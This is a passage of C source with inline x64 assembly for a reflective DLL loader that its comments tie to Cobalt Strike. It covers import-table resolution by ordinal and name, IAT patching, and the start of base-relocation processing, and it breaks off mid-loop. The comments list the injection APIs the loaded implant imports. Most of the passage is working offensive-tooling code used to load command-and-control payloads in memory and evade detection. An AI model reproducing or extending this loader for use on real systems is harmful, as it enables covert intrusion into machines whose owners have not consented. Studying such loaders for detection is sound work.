//     } IMAGE_IMPORT_DESCRIPTOR;
//     typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;


	// Cobalt Strike Reflective DLL imports these Modules:
	// Kernel32.dll
	// GetProcAddress("kernel32.dll", VirtualProtectEx TerminateProcess ReadProcessMemory WriteProcessMemory GetThreadContext ResumeThread
	//     CreateProcessA GetCurrentDirectoryW GetFullPathNameA GetLogicalDrives FindClose SystemTimeToTzSpecificLocalTime 
	//     FileTimeToSystemTime ExpandEnvironmentStringsA GetFileAttributesA FindFirstFileA FindNextFileA CopyFileA MoveFileA
	//     VirtualProctect OpenProcess GetCurrentProcessId VirtualAllocEx CreateThread OpenThread CreateToolhelp32Snapshot
	//     Thread32First Thread32Next CreateRemoteThread SetThreadContext MapViewOfFile UnmapViewOfFile CreateFileMappingA 
	//     Wow64GetThreadContext SetLastError SetNamedPipeHandleState PeekNamedPipe CreateFileA WaitNamedPipeA GetModuleFileNameA
	//     OpenProcessToken ++ 
	// ADVAPI32.DLL
	//   GetTokenInformation ++ 
	// WININET.dll
	//   InternetReadFile InternetCloseHandle InternetConnectA InternetQueryDataAvaiable InternetQueryOptionA HttpOpenRequestA 
	//   HttpAddRequestHeadersA HttpSendRequestA HttpqueryInfoA InternetOpenA 
	// ws2_32.dll
	//   WSASocketA WSAIoctl 

/*
	// kernel32Addr = Kernel32 address, we already found it and know its loaded
	// ADVAPI32.DL
	char advapi32Str[] = "ADVAPI32.DLL";
	PVOID advapi32Addr = (PVOID)pLoadLibraryA( (LPCSTR)(advapi32Str) );
	// WININET.dll
	char wininetStr[] = "WININET.dll";
	PVOID wininetAddr = (PVOID)pLoadLibraryA( (LPCSTR)(wininetStr) );
	// ws2_32.dll
	char ws232Str[] = "ws2_32.dll";
	PVOID ws232Addr = (PVOID)pLoadLibraryA( (LPCSTR)(ws232Str) );

	__asm__(
		"nop \n"
		"nop \n"
		//"int3 \n"
		"nop \n"
		"nop \n"
	);
*/

	PVOID ImportedDllAddr;
	PVOID nextModuleImportDescriptor = rdllImportDirectoryAddr;
	PVOID importedDllExportAddressTable;
	PVOID importedDllExportNameTable;
	PVOID importedDllExportOrdinalTable;
	PVOID importEntryHint;
	PVOID importedDllBaseOrdinal; 
	PVOID importEntryExportTableIndex; 
	PVOID importEntryAddressRVA; 
	PVOID importEntryAddress; 


//	typedef struct _IMAGE_IMPORT_DESCRIPTOR {
//       __C89_NAMELESS union {		// size of this union is 4 bytes because the biggest member of this union is a DWORD (4 bytes)
//     DWORD Characteristics;		//   A union stores one of the options listed in the union, but can only be one of the options
//     DWORD OriginalFirstThunk;
//       } DUMMYUNIONNAME;  		// 4 bytes
//       DWORD TimeDateStamp;		//+4 bytes
//       DWORD ForwarderChain;		//+4 bytes
//       DWORD Name;				//+4 bytes
//       DWORD FirstThunk;			//+4 bytes
//     } IMAGE_IMPORT_DESCRIPTOR;	// = 20 bytes (0x14 bytes)
//     typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
		// We need to get the name of the first imported DLL from the first IMAGE_IMPORT_DESCRIPTOR entry in the list of our RDLL's Import directory
		// This will start our loop. Once we import all the symbols/API's we need for that DLL, we will move to the next IMAGE_IMPORT_DESCRIPTOR entry
		//   by adding the address of this first import descriptor with the size of the import descriptor struct
		// importNameRVA = IMAGE_IMPORT_DESCRIPTOR->Name 
		// importName = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
		PVOID importNameRVA;
		PVOID importName;
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n"
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"xor r12, r12 \n"
			"add rax, 0xC \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
			"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
			"pop r12 \n"             // R12&RBX = RVA of Name DLL
			"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
			"je check1 \n"
			"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
			"check1: \n"
			"mov %[importNameRVA], r12 \n" 
			"mov %[importName], rbx \n" 
			:[importNameRVA] "=r" (importNameRVA),
			 [importName] "=r" (importName)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);
	// Import all the symbols from all the import tables listed in the import directory
	PVOID importLookupTableEntry;
	PVOID importAddressTableEntry;
	PVOID importEntryNameString;
	PVOID importEntryNameStringLength;
	PVOID importEntryFunctionAddress;
	PVOID checkNullImportAddressTableEntry;
	// The last entry in the image import directory is all zeros
	//while( ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name )
	while(importNameRVA)
	{
		// use LoadLibraryA to load the imported module into memory

		//ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name ) );
		ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( importName ));

		// importLookupTableEntry = VA of the OriginalFirstThunk
		//importLookupTableEntry = ( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk );
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n" // 0 byte offset is the address of the DWORD OriginalFirstThunk within the image import descriptor
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
			"add rbx, r11 \n" 		 // importLookupTableEntry = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
			"mov %[importLookupTableEntry], rbx \n" 
			:[importLookupTableEntry] "=r" (importLookupTableEntry)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);

		// importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
		//importAddressTableEntry = ( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk );
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n" 
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"add rax, 0x10 \n" 	     // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descripto
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
			"add rbx, r11 \n" 		 // importAddressTableEntry = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
			"mov %[importAddressTableEntry], rbx \n" 
			:[importAddressTableEntry] "=r" (importAddressTableEntry)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);
		__asm__(
			"mov rax, %[importAddressTableEntry] \n" 
			"mov rax, [rax] \n"
			"mov %[checkNullImportAddressTableEntry], rax \n" 
			:[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
			:[importAddressTableEntry] "r" (importAddressTableEntry)
		);
		// itterate through all imported functions, importing by ordinal if no name present
		while(checkNullImportAddressTableEntry)
		{
			//importedDllExportDirectory = ImportedDllAddr + ((PIMAGE_DOS_HEADER)ImportedDllAddr)->e_lfanew;
			// uiNameArray = the address of the modules export directory entry
			//uiNameArray = (PVOID)&((PIMAGE_NT_HEADERS)importedDllExportDirectory)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
			// get the VA of the export directory
			//importedDllExportDirectory = ( ImportedDllAddr + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );
			// STEP 1 | Export Directory for current module/DLL being imported
			__asm__(
				"mov rcx, %[ImportedDllAddr] \n"
				"mov rbx, rcx \n"
				"mov r8, rcx \n"
				"mov ebx, [rbx+0x3C] \n"
				"add rbx, r8 \n"
				"xor rcx, rcx \n"
				"add cx, 0x88 \n"
				"mov edx, [rbx+rcx] \n"
				"add rdx, r8 \n"
				"mov %[importedDllExportDirectory], rdx \n"
				:[importedDllExportDirectory] "=r" (importedDllExportDirectory)
				:[ImportedDllAddr] "r" (ImportedDllAddr)
			);
		
				//     typedef struct _IMAGE_EXPORT_DIRECTORY {
				//       DWORD Characteristics;        // 0x0  offset
				//       DWORD TimeDateStamp;          // 0x4  offset
				//       WORD MajorVersion;            // 0x8  offset
				//       WORD MinorVersion;            // 0xA  offset
				//       DWORD Name;                   // 0xC  offset
				//       DWORD Base;                   // 0x10 offset
				//       DWORD NumberOfFunctions;      // 0x14 offset
				//       DWORD NumberOfNames;          // 0x18 offset
				//       DWORD AddressOfFunctions;     // 0x1C offset  // ExportAddressTable
				//       DWORD AddressOfNames;         // 0x20 offset
				//       DWORD AddressOfNameOrdinals;  // 0x24 offset
				//     } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;
			// get the VA for the array of addresses
			//importedDllExportAddressTable = ( ImportedDllAddr + ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->AddressOfFunctions );

			// STEP 2.1 | Export Address Table address for the current module being imported
			__asm__(
				"mov rcx, %[importedDllExportDirectory] \n"
				"mov rdx, %[ImportedDllAddr] \n"
				"xor rax, rax \n"
				"add rcx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RCX = &RVAExportAddressTable
				"mov eax, [rcx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
				"add rax, rdx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
				"mov %[importedDllExportAddressTable], rax \n"
				:[importedDllExportAddressTable] "=r" (importedDllExportAddressTable)
				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
				 [ImportedDllAddr] "r" (ImportedDllAddr)
			);
			// STEP 2.2 | Export AddressOfNames Table address for the current module being imported
			__asm__(
				"mov rcx, %[importedDllExportDirectory] \n"
				"mov rdx, %[ImportedDllAddr] \n"
				"xor rax, rax \n"
				"add rcx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
				"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
				"add rax, rdx \n"          // RAX = VA ExportAddressOfNames 
				"mov %[importedDllExportNameTable], rax \n"
				:[importedDllExportNameTable] "=r" (importedDllExportNameTable)
				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
			 	 [ImportedDllAddr] "r" (ImportedDllAddr)
			);
			// STEP 2.3 | Export AddressOfNameOrdinals Table address for the current module being imported
			__asm__(
				"mov rcx, %[importedDllExportDirectory] \n"
				"mov rdx, %[ImportedDllAddr] \n"
				"xor rax, rax \n"
				"add rcx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
				"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
				"add rax, rdx \n"          // RAX = VA ExportAddressOfNameOrdinals 
				"mov %[importedDllExportOrdinalTable], rax \n"
				:[importedDllExportOrdinalTable] "=r" (importedDllExportOrdinalTable)
				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
				 [ImportedDllAddr] "r" (ImportedDllAddr)
			);
			if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// STEP 3 | Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
				//   This is located in the Export Directory in memory of the module which functions/api's are being imported
				// importedDllBaseOrdinal = ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->Base;
				__asm__(
					"mov rcx, %[importedDllExportDirectory] \n"
					"xor rax, rax \n"
					"add rcx, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
					"mov eax, [rcx] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
					"mov %[importedDllBaseOrdinal], rax \n"
					:[importedDllBaseOrdinal] "=r" (importedDllBaseOrdinal)
					:[importedDllExportDirectory] "r" (importedDllExportDirectory)
				);
				// STEP 4 | Import Hint from the modules Hint/Name table
				//     typedef struct _IMAGE_THUNK_DATA64 {
				//       union {
				//     ULONGLONG ForwarderString;
				//     ULONGLONG Function;
				//     ULONGLONG Ordinal;
				//     ULONGLONG AddressOfData;
				//       } u1;
				//     } IMAGE_THUNK_DATA64;
				// importEntryHint = ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal ));
				__asm__(
					"mov rax, %[importLookupTableEntry] \n"
					"mov rax, [rax] \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
					"and eax, 0xFFFF \n" // get rid of the 8
					"mov %[importEntryHint], rax \n"
					:[importEntryHint] "=r" (importEntryHint)
					:[importLookupTableEntry] "r" (importLookupTableEntry)
				);
				// STEP 5 | Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
				// Import Hint from Hint/Name Table (first 2 bytes before the name string)
				// ImportHint - ExportBaseOrdinal = The location of the API/function in the ExportAddressTable entries
				// importEntryExportTableIndex = importEntryHint - importedDllBaseOrdinal;
				__asm__(
					"mov rax, %[importEntryHint] \n"
					"mov r11, %[importedDllBaseOrdinal] \n"
					"sub rax, r11 \n"
					"mov %[importEntryExportTableIndex], rax \n"
					:[importEntryExportTableIndex] "=r" (importEntryExportTableIndex)
					:[importEntryHint] "r" (importEntryHint),
					 [importedDllBaseOrdinal] "r" (importedDllBaseOrdinal)
				);
				// STEP 6 | Get the RVA for our Import Entry executable function address
				// The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
				// importEntryAddressRVA = importEntryExportTableIndex * sizeof(DWORD) + importedDllExportAddressTable;
				__asm__(
					"mov rax, %[importEntryExportTableIndex] \n"
					"mov rcx, %[importedDllExportAddressTable] \n"
					"xor rbx, rbx \n"
					"add bl, 0x4 \n"                  // RBX = sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
					"mul rbx \n"                      // RAX = importEntryExportTableIndex * sizeof(DWORD)
					"add rax, rcx \n"                 // RAX = RVA for our functions address
					"mov %[importEntryAddressRVA], rax \n"          // Save &module.<API> to the variable importEntryAddressRVA
					:[importEntryAddressRVA] "=r" (importEntryAddressRVA)
					:[importEntryExportTableIndex]"r"(importEntryExportTableIndex),
					[importedDllExportAddressTable]"r"(importedDllExportAddressTable)
					
				);
				// STEP 7 | Get the real address for our imported function and write it to our import table
				// patch in the address for this imported function
				// Debugging how this works for the first imported symbol from ws2_32.dll as an example
				// __asm__(
				//	"int3 \n"
				// );
				// RAX = importEntryAddressRVA = ws2_32.00007FFA5678E500
				// RAX = DEREF_32(importEntryAddressRVA) = 00002320
				// RCX = RAX
				// 	00007FFA5678E500          | 2023
				// 	00007FFA5678E502          | 0000
				// RAX = importAddressTableEntry
				// RDX = ImportedDllAddr = Address=00007FFA56740000 | Page Information=ws2_32.dll
				// RDX = ImportedDllAddr + RAX (00002320)
				// RDX = 00007FFA56742320 <ws2_32.send>
				// DEREF(importAddressTableEntry) = ( ImportedDllAddr + DEREF_32(importEntryAddressRVA) );
				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rdx, %[importEntryAddressRVA] \n"
					"mov rcx, %[ImportedDllAddr] \n"
					"xor rbx, rbx \n"
					"mov ebx, [rdx] \n"  // EBX = The RVA for the executable function we are importing
					"add rcx, rbx \n"    // RCX = The executable address within the imported DLL for the function we imported
					"mov [rax], rcx \n"  // write the address of the imported api to our import table
					: // no outputs
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
					 [importEntryAddressRVA] "r" (importEntryAddressRVA),  // RDX = 00007FFA56740000 &ws2_32.dll
					 [ImportedDllAddr] "r" (ImportedDllAddr) // RCX = ws2_32.00007FFA5678E500
              			);
			}
			else
			{
				// STEP 8 | If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
				// get the VA of this functions import by name struct
				// 00000000001CACA6 = importNameHintEntry
				// HEAP DUMP####
				//		00000000001CACA6 61757472695604FF ÿ.Virtua 
				// 		00000000001CACAE 746365746F72506C lProtect 
				// 		00000000001CACB6 655404CE00007845 Ex..Î.Te 
				//PVOID importNameHintEntry = ( newRdllAddr + DEREF(importAddressTableEntry) ); // First Thunk
				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rcx, %[newRdllAddr] \n"
					"xor rbx, rbx \n"
					"mov rbx, [rax] \n" // RVA for our functions Name/Hint table entry
					"add rcx, rbx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
					"add rcx, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
					"mov %[importEntryNameString], rcx \n" // RCX = Address of our Name string for our import
					:[importEntryNameString] "=r" (importEntryNameString) 
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
					 [newRdllAddr] "r" (newRdllAddr) // RCX 
				);
				// Get the string length for the import function name
				__asm__(
					"mov rax, %[importEntryNameString] \n"
					"xor rcx, rcx \n"
					"stringLengthCounterLoop: \n"
					"inc cl \n" // increment the name string length counter
					"xor rbx, rbx \n"
					"cmp bl, [rax] \n" // are we at the null terminator for the string?
					"je foundStringLength \n"
					"inc rax \n" // move to the next char of the string
					"jmp short stringLengthCounterLoop \n"
					"foundStringLength: \n"
					"mov %[importEntryNameStringLength], rcx \n" 
					:[importEntryNameStringLength] "=r" (importEntryNameStringLength) 
					:[importEntryNameString] "r" (importEntryNameString) 
				);	
				// use GetProcAddress and patch in the address for this imported function
				    // typedef struct _IMAGE_IMPORT_BY_NAME {
					// 	WORD Hint;
					// 	CHAR Name[1];
					// } IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;
				importEntryAddress = (PVOID)pGetProcAddress( (HMODULE)ImportedDllAddr, (LPCSTR)importEntryNameString );
				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rdx, %[importEntryAddress] \n"
					"xor rbx, rbx \n"
					"mov [rax], rdx \n"  // write the address of the imported api to our import table
					: // no outputs
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
					 [importEntryAddress] "r" (importEntryAddress) 
                 		);
			}
			// get the next imported function
			importAddressTableEntry += 0x8;
			if( importLookupTableEntry )
				importLookupTableEntry += 0x8;
			__asm__(
				"mov rax, %[importAddressTableEntry] \n" 
				"mov rax, [rax] \n"
				"mov %[checkNullImportAddressTableEntry], rax \n" 
				:[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
				:[importAddressTableEntry] "r" (importAddressTableEntry)
			);
		}

		// get the next import
		// nextModuleImportDescriptor += sizeof( IMAGE_IMPORT_DESCRIPTOR );
		// nextModuleImportDescriptor += 20;
		__asm__(
			"mov rax, %[inNextModuleImportDescriptork] \n"
			"add rax, 0x14 \n" // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
			"mov %[outNextModuleImportDescriptor], rax \n"
			:[outNextModuleImportDescriptor] "=r" (nextModuleImportDescriptor)
			:[inNextModuleImportDescriptork] "r" (nextModuleImportDescriptor)
		);
		// We need to do this again for the next module/DLL in the Import Directory
		// We know we've reached the end of the DLL import entries when we hit a Import descriptor structure that is all 0's
		//   therefor if the struct is all zeros, the name DWORD within that struct will be zeros
		// importNameRVA = IMAGE_IMPORT_DESCRIPTOR->Name 
		// importName = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n"
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"xor r12, r12 \n"
			"add rax, 0xC  \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
			"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
			"pop r12 \n"             // R12&RBX = RVA of Name DLL
			"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
			"je check2 \n"
			"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
			"check2: \n"
			"mov %[importNameRVA], r12 \n" 
			"mov %[importName], rbx \n" 
			:[importNameRVA] "=r" (importNameRVA),
			 [importName] "=r" (importName)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);
	}

	// STEP 5: process all of our images relocations...
	PVOID newRdllNewExeHeaderAddr;
	__asm__(
		"mov rax, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x3C] \n"       // RBX = Offset NewEXEHeader
		"add rbx, rax \n"              // RBX = &reflectiveDll.dll + Offset NewEXEHeader = &NewEXEHeader
		"mov %[newRdllNewExeHeaderAddr], rbx \n"  // newRdllNewExeHeaderAddr = ((PIMAGE_DOS_HEADER)newRdllAddr)->e_lfanew
		:[newRdllNewExeHeaderAddr] "=r" (newRdllNewExeHeaderAddr)
		:[newRdllAddr] "r" (newRdllAddr)
	);
	PVOID newRdllOptionalHeaderAddr;
	__asm__(
		"mov rax, %[newRdllNewExeHeaderAddr] \n"
		"add rax, 0x18 \n"
		"mov %[newRdllOptionalHeaderAddr], rax \n"
		:[newRdllOptionalHeaderAddr] "=r" (newRdllOptionalHeaderAddr)
		:[newRdllNewExeHeaderAddr] "r" (newRdllNewExeHeaderAddr)
	);
	// calculate the base address delta and perform relocations (even if we load at desired image base)
	PVOID BaseAddressDelta;
	//BaseAddressDelta = newRdllAddr - ((PIMAGE_NT_HEADERS)newRdllNewExeHeaderAddr)->OptionalHeader.ImageBase;
	__asm__(
		"mov rax, %[newRdllOptionalHeaderAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x18 \n"
		"add rax, rbx \n"                              // OptionalHeader.ImageBase
		"mov rax, [rax] \n"
		"sub rcx, rax \n"                              // newRdllAddr.ImageBase
		"mov %[BaseAddressDelta], rcx \n"
		:[BaseAddressDelta] "=r" (BaseAddressDelta)
		:[newRdllOptionalHeaderAddr] "r" (newRdllOptionalHeaderAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);

//     typedef struct _IMAGE_OPTIONAL_HEADER {
//       WORD Magic;
//       BYTE MajorLinkerVersion;
//       BYTE MinorLinkerVersion;
//       DWORD SizeOfCode;
//       DWORD SizeOfInitializedData;
//       DWORD SizeOfUninitializedData;
//       DWORD AddressOfEntryPoint;
//       DWORD BaseOfCode;
//       DWORD BaseOfData;
//       DWORD ImageBase;
//       DWORD SectionAlignment;
//       DWORD FileAlignment;
//       WORD MajorOperatingSystemVersion;
//       WORD MinorOperatingSystemVersion;
//       WORD MajorImageVersion;
//       WORD MinorImageVersion;
//       WORD MajorSubsystemVersion;
//       WORD MinorSubsystemVersion;
//       DWORD Win32VersionValue;
//       DWORD SizeOfImage;
//       DWORD SizeOfHeaders;
//       DWORD CheckSum;
//       WORD Subsystem;
//       WORD DllCharacteristics;
//       DWORD SizeOfStackReserve;
//       DWORD SizeOfStackCommit;
//       DWORD SizeOfHeapReserve;
//       DWORD SizeOfHeapCommit;
//       DWORD LoaderFlags;
//       DWORD NumberOfRvaAndSizes;
//       IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
//     } IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;

	// newRelocationDirectoryAddr = the address of the base relocation directory from the newRDLL's Optional Header
	// newRelocationDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
	PVOID newRelocationDirectoryAddr;
	__asm__(
		"mov rax, %[newRdllOptionalHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x98 \n"            // OptionalHeaderAddr + 0x98 = &DataDirectory[Base Relocation Table]
		"add rax, rbx \n"             // OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		"mov %[newRelocationDirectoryAddr], rax \n"
		:[newRelocationDirectoryAddr] "=r" (newRelocationDirectoryAddr)
		:[newRdllOptionalHeaderAddr] "r" (newRdllOptionalHeaderAddr)
	);
	// The Relative Virtual Address (Offset from newRDLL base Address) of the Base Relocation Table 
	// newRdllAddr + ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->VirtualAddress
	// typedef struct _IMAGE_DATA_DIRECTORY {
	//       DWORD VirtualAddress;
	//       DWORD Size;
	// } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
	PVOID newRelocationTableAddr;
	__asm__(
		"mov rax, %[newRelocationDirectoryAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax] \n"  // Move the 4 byte DWORD Virtual Address of the Relocation Directory table into the EBX register
		"add rcx, rbx \n"    // newRelocationTableAddr = newRdllAddr + RVAnewRelocationTable
		"mov %[newRelocationTableAddr], rcx \n"
		:[newRelocationTableAddr] "=r" (newRelocationTableAddr)
		:[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);
	// The Size of the Base Relocation Table 
	// PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->Size
	PVOID newRelocationDirectorySize;
	__asm__(
		"mov rax, %[newRelocationDirectoryAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD Size of the Relocation Directory table into the EBX register
		"mov %[newRelocationDirectorySize], rbx \n"
		:[newRelocationDirectorySize] "=r" (newRelocationDirectorySize)
		:[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr)
	);
	// check if their are any relocations present

	//if( ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->Size )
	if(newRelocationDirectorySize)
	{
		PVOID nextRelocationBlock;
		// newRelocationDirectoryAddr is now the first entry (IMAGE_BASE_RELOCATION)
		//nextRelocationBlock = ( newRdllAddr + ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->VirtualAddress );
		nextRelocationBlock  = newRelocationTableAddr;
		//	typedef struct _IMAGE_BASE_RELOCATION {
		//       DWORD VirtualAddress;
		//       DWORD SizeOfBlock;
		//     } IMAGE_BASE_RELOCATION;
		//     typedef IMAGE_BASE_RELOCATION UNALIGNED *PIMAGE_BASE_RELOCATION;
		// (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
		PVOID relocSizeOfBlock;
		__asm__(
			"mov rax, %[newRelocationTableAddr] \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
			"mov %[relocSizeOfBlock], rbx \n"
			:[relocSizeOfBlock] "=r" (relocSizeOfBlock)
			:[newRelocationTableAddr] "r" (newRelocationTableAddr)
		);
		PVOID relocVirtualAddress;
		PVOID RelocBlockEntries;
		PVOID nextRelocBlockEntryAddress;
		//while( ((PIMAGE_BASE_RELOCATION)nextRelocationBlock)->SizeOfBlock )
		while(relocSizeOfBlock)
		{
			// relocVirtualAddress = the VA for this relocation block
			//relocVirtualAddress = ( newRdllAddr + ((PIMAGE_BASE_RELOCATION)nextRelocationBlock)->VirtualAddress );
			__asm__(
				"mov rax, %[nextRelocationBlock] \n"
				"mov r11, %[newRdllAddr] \n"
				"xor rbx, rbx \n"
				"mov ebx, [rax] \n"   // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress into EBX
				"add r11, rbx \n"     // R11 = &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
				"mov %[relocVirtualAddress], r11 \n"
				:[relocVirtualAddress] "=r" (relocVirtualAddress)
				:[nextRelocationBlock] "r" (nextRelocationBlock),
				 [newRdllAddr] "r" (newRdllAddr)
			);
			// RelocBlockEntries = number of entries in this relocation block
			// 0x8 = this first 8 bytes of the blocks entry list which is the IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
			// 0x2 = each entry is a WORD/2 bytes. first 4 bits are the type (~0xA) and last 12 bits are the offset for the relocation which then needs to be added to the BlockRVA and the VA of RDLL 
			//RelocBlockEntries = ( relocSizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
			// RelocBlockEntries = ( relocSizeOfBlock - 8 ) / 2;
			__asm__(
				"mov rax, %[relocSizeOfBlock] \n"
				"xor rbx, rbx \n"
				"xor rdx, rdx \n"
				"inc bl \n"
				"inc bl \n" // RBX = 0x2 = size of image relocation WORD
				"sub ax, 0x8 \n" // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
